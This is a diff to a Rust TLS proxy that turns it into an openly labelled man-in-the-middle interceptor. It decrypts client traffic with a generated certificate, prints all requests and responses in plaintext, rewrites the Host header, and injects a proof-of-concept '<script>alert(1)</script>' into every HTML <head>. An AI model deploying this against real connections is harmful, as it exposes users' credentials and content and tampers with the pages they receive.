@@ -3,13 +3,13 @@ use tokio::io::AsyncReadExt;
 use tokio::io::AsyncWriteExt;
 use tokio::net::TcpListener;
 use tokio::net::TcpStream;
-use tokio_rustls::rustls::pki_types::PrivateKeyDer;
-use tokio_rustls::rustls::pki_types::CertificateDer;
-use tokio_rustls::rustls::ServerConfig;
 use tokio_rustls::TlsAcceptor;
-
+use tokio_rustls::TlsConnector;
+use tokio_rustls::rustls::ServerName;
 use std::sync::Arc;
-use crate::ssl::generate_self_signed_certificate;
+use std::convert::TryFrom;
+
+use crate::tls::{generate_tls_acceptor, generate_tls_connector, MaybeTlsStream};
 
 pub async fn start_ssl_proxy(server_address: &str, target_address: &str, ssl_issuer: &str) -> Result<(), Box<dyn Error>> {
     let acceptor = generate_tls_acceptor(ssl_issuer)?;
@@ -24,9 +24,8 @@ pub async fn start_ssl_proxy(server_address: &str, target_address: &str, ssl_iss
         let target_address = target_address.to_string();
 
         tokio::spawn(async move {
-            if let Err(e) = handle_connection(acceptor, stream, &target_address).await {
+            if let Err(e) = handle_connection(acceptor, stream, target_address).await {
                 eprintln!("Error handling connection: {:?}", e);
-            } else {
             }
         });
     }
@@ -34,10 +33,41 @@ pub async fn start_ssl_proxy(server_address: &str, target_address: &str, ssl_iss
     Ok(())
 }
 
-async fn handle_connection(acceptor: TlsAcceptor, stream: TcpStream, target_address: &str) -> Result<(), Box<dyn Error>> {
-    let mut client_stream = acceptor.accept(stream).await?;
+async fn handle_connection(acceptor: TlsAcceptor, stream: TcpStream, target_address: String) -> Result<(), Box<dyn Error>> {
+    println!("Accepted connection from client.");
 
-    let mut server_stream = TcpStream::connect(target_address).await?;
+    // Accept TLS connection from client
+    let mut client_stream = acceptor.accept(stream).await?;
+    println!("TLS handshake with client successful.");
+
+    let (trim_target_address, domain, is_target_https) = {
+        let trim_target_address = target_address.trim_start_matches("https://").trim_start_matches("http://");
+        let is_target_https = target_address.starts_with("https://");
+        let domain = trim_target_address.split(':').next().ok_or("Invalid target address")?.to_string();
+
+        (trim_target_address, domain.to_string(), is_target_https)
+    };
+
+    let mut server_stream = if is_target_https {
+        println!("Connecting to target (TLS): {}", trim_target_address);
+
+        let connector = generate_tls_connector()?;
+        let server_name = ServerName::try_from(domain.as_str()).map_err(|_| "Invalid domain for ServerName")?;
+
+        let stream = TcpStream::connect(trim_target_address).await?;
+
+        let server_stream = TlsConnector::from(Arc::new(connector)).connect(server_name, stream).await?;
+        println!("TLS handshake with server successful.");
+
+        MaybeTlsStream::Tls(server_stream)
+    } else {
+        println!("Connecting to target (plain): {}", trim_target_address);
+
+        let server_stream = TcpStream::connect(trim_target_address).await?;
+        println!("Connected to target (plain).");
+
+        MaybeTlsStream::Plain(server_stream)
+    };
 
     let mut client_to_server_buffer = vec![0u8; 4096];
     let mut server_to_client_buffer = vec![0u8; 4096];
@@ -47,17 +77,48 @@ async fn handle_connection(acceptor: TlsAcceptor, stream: TcpStream, target_addr
             client_read = client_stream.read(&mut client_to_server_buffer) => {
                 let n = client_read?;
                 if n == 0 {
+                    println!("Client closed the connection.");
                     break;
                 }
-                server_stream.write_all(&client_to_server_buffer[..n]).await?;
-            }
+                println!("Read {} bytes from client", n);
 
-            server_read = server_stream.read(&mut server_to_client_buffer) => {
-                let n = server_read?;
-                if n == 0 {
-                    break;
+                // Parse and modify the HTTP request header - MITM MITM
+                if let Ok(decoded) = std::str::from_utf8(&client_to_server_buffer[..n]) {
+                    println!("\n\nReceived from client:\n{}\n\n", decoded);
+                    let modified_request = modify_host_header(decoded, &domain);
+                    server_stream.write_all(modified_request.as_bytes()).await?;
+                } else {
+                    server_stream.write_all(&client_to_server_buffer[..n]).await?;
                 }
-                client_stream.write_all(&server_to_client_buffer[..n]).await?;
+
+                println!("Forwarded {} bytes to server.", n);
+            }
+    
+            server_read = server_stream.read(&mut server_to_client_buffer) => {
+                match server_read {
+                    Ok(n) => {
+                        if n == 0 {
+                            println!("Server closed the connection.");
+                            break;
+                        }
+                        println!("Read {} bytes from server", n);
+
+                        // Parse and modify the HTTP response - MITM MITM
+                        if let Ok(decoded) = std::str::from_utf8(&server_to_client_buffer[..n]) {
+                            println!("\n\nReceived from server:\n{}\n\n", decoded);
+                            let modified_response = modify_response(decoded);
+                            client_stream.write_all(modified_response.as_bytes()).await?;
+                        } else {
+                            client_stream.write_all(&server_to_client_buffer[..n]).await?;
+                        }
+
+                        println!("Forwarded {} bytes to client.", n);
+                    }
+                    Err(e) => {
+                        eprintln!("Failed to read from server: {}", e);
+                        break;
+                    }
+                }
             }
         }
     }
@@ -65,14 +126,38 @@ async fn handle_connection(acceptor: TlsAcceptor, stream: TcpStream, target_addr
     Ok(())
 }
 
-fn generate_tls_acceptor(ssl_issuer: &str) -> Result<TlsAcceptor, Box<dyn Error>> {
-    let (cert, private_key) = generate_self_signed_certificate(ssl_issuer)?;
-    let rustls_cert = CertificateDer::try_from(cert)?;
-    let rustls_private_key = PrivateKeyDer::try_from(private_key)?;
+// mitm mitm
+fn modify_host_header(request: &str, domain: &str) -> String {
+    let mut modified_request = String::new();
+    for line in request.lines() {
+        if line.starts_with("Host:") {
+            modified_request.push_str(&format!("Host: {}\r\n", domain));
+            println!("------------ MODIFIED HOST HEADER! ---------------");
+            println!("++++ Host: {}\r\n", domain)
+        } else {
+            modified_request.push_str(line);
+            modified_request.push_str("\r\n");
+        }
+    }
+    modified_request
+}
 
-    let config = ServerConfig::builder()
-        .with_no_client_auth()
-        .with_single_cert(vec![rustls_cert], rustls_private_key)?;
 
-    Ok(TlsAcceptor::from(Arc::new(config)))
+// MITM MITM
+fn modify_response(response: &str) -> String {
+    let mut modified_response = String::new();
+
+    for line in response.lines() {
+        if line.contains("<head>") {
+            let payload = &format!("<head><script>alert(1)</script>");
+            modified_response.push_str(payload);
+            println!("------------ MODIFIED WEBSITE! ---------------");
+            println!("++++ <head>: {}\r\n", payload)
+        }  else {
+            modified_response.push_str(line);
+            modified_response.push_str("\r\n");
+        }
+    }
+
+    modified_response
 }
